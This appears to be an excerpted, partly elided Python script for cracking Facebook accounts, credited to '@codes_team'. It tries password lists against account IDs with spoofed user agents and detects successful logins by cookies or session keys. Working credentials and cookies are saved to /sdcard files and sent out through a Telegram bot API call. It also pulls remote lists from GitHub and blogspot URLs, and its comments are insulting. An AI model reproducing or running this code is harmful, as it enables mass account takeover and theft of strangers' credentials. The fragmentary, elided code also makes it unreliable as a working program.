...
#DeCoDeD By Amer
#آخِتٌبًئتٌ تٌحًتٌ آلَمًطِر لَأخِفُيَ دٍمًوٌعٌيَ فُبًکْىَ آلَمًطِر لَبًکْآئيَ کْثًيَرآ
#If Wanna Be Like Me =)), Just Kiss My Ass :)
# os.system('xdg-open https://t.me/bsx_h1')
...
# compare_phone_time()
# import datetime;now = datetime.date.today();target = datetime.date(2024,5,16)
# if now >=target:exit("@codes_team  @codes_team ﺪﻨﻋ ةﺍﺩﺍ ﻲﻓ كﺍﺮﺘﺷﻻﺍ ﻚﻨﻜﻤﻳ ةﺍﺩﺍ ﻒﻗﻮﺗ ﺪﻨﻋ مﺎﻀﻧ♕@codes_team♕ ")
...
# else:
 # print('  ')
 # exit('\x1b[38;5;196m  ﻪﺤﻴﺤﺼﻟﺍ ﺮﺴﻟﺍ ﻪﻤﻠﻛ ﻞﺧﺩﺍ ب ﻢﻗ ءﺎﻄﺧ ×        ')
 #DeCoDeD By Amer
#آخِتٌبًئتٌ تٌحًتٌ آلَمًطِر لَأخِفُيَ دٍمًوٌعٌيَ فُبًکْىَ آلَمًطِر لَبًکْآئيَ کْثًيَرآ
#If Wanna Be Like Me =)), Just Kiss My Ass :)
...
\x1b[1;36m{+} \x1b[1;32𝘼𝙈𝙀𝙍.  \x1b[1;32m: ░▒▓█►─═ EGYPT-ONLY ═─◄█▓▒░
\x1b[1;36m{+} \x1b[1;33m𝘼𝙈𝙀𝙍   \x1b[1;33m: \x1b[1;33m @codes_team
\033[1;33m ━━━━━━━━━━━━━━━━━━━ \033[1;32 \33[1;34m━━━━━━━━━━━━━━━━━━━━               
""")
                               
def linex():
        print('\033[1;37mᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ @codes_team ᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ')
def clear():
        os.system('clear')
        #DeCoDeD By Amer
        #آخِتٌبًئتٌ تٌحًتٌ آلَمًطِر لَأخِفُيَ دٍمًوٌعٌيَ فُبًکْىَ آلَمًطِر لَبًکْآئيَ کْثًيَرآ
        #If Wanna Be Like Me =)), Just Kiss My Ass :)
        print(('\033[92m—'*25)+'\n• DeCoDe By @coder_amer•\n'+('—'*25))
        print(logo)
        print(('\033[92m—'*25)+'\n• DeCoDe By @coder_amer•\n'+('—'*25))
loop=0
lim=0
...
def auto_file(cookies,access_token):
        ...
        print('\n \033[1;97m /sdcard/@codes_team.txt \033[0;97m\n')
        #100010138361148
...
#آخِتٌبًئتٌ تٌحًتٌ آلَمًطِر لَأخِفُيَ دٍمًوٌعٌيَ فُبًکْىَ آلَمًطِر لَبًکْآئيَ کْثًيَرآ
#If Wanna Be Like Me =)), Just Kiss My Ass :)                
xny = ('https://raw.githubusercontent.com/ffdvl1120/ap/main/jf')

def za():
    global tp
    myid = getKey()
    os.system(" clear ")
    ux=('https://jxbjutt.blogspot.com/2023/01/server2txt.html')
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;37m [\033[1;32m@codes_team\033[1;37m] \033[1;37m[\033[1;32m%s\033[1;37m] \033[1;37m[\033[1;32mOK\033[1;37m/\033[1;91mCP\033[1;37m] \033[1;37m[\033[1;32m%s\033[1;37m\033[1;37m] \033[1;37m[\033[1;96m%s%%\033[1;37m]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
    ...
    "user-agent": ua,
                        ...
                        if "c_user" in ASX:
                                ...
                                print(f'''
\r{G7}𝙶𝙾𝙾𝙳 ✔	
ᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ @codes_team ᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ
•  𝙴𝙼𝙰𝙸𝙻     : {ids}
•  𝙿𝙰𝚂𝚂𝚆𝙾𝚁𝙳 : {pas}
ᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ @codes_team ᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ
• 𝙱𝚈 : @codes_team - @coder_amer
ᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ	
				''')
                                statusok = f'''
       𝙶𝙾𝙾𝙳	✔	
	  ᯓᯓᯓᯓᯓ @codes_team ᯓᯓᯓᯓᯓ
		•  𝙴𝙼𝙰𝙸𝙻     : {ids}
		•  𝙿𝙰𝚂𝚂𝚆𝙾𝚁𝙳 : {pas}
                •  كوكيز : {kuki}
	  ᯓᯓᯓᯓᯓ @codes_team ᯓᯓᯓᯓᯓ
	    • 𝙱𝚈 : @codes_team - @codes_team
				...
				'''
                                ...
                                open('/sdcard/@codes_team-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
...
ᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ	
	  ...
	  ᯓᯓᯓᯓᯓ @codes_team ᯓᯓᯓᯓᯓ
	    • 𝙱𝚈 : @codes_team - @codes_team
				...
				'''
                                        requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                                        open('/sdcard/@codes_team-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
	  ...
	  ᯓᯓᯓᯓᯓ @codes_team ᯓᯓᯓᯓᯓ
	    • 𝙱𝚈 : @codes_team - @codes_team
				...
				'''
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m [@codes_team-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/@codes_team-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
...
def api1(ids,names,passlist):
    ...
    "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [@codes_team-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/@codes_team-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                        ...
                                        if 'y' in pcp:
                                                ...
                                                open('/sdcard/@codes_teamCP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
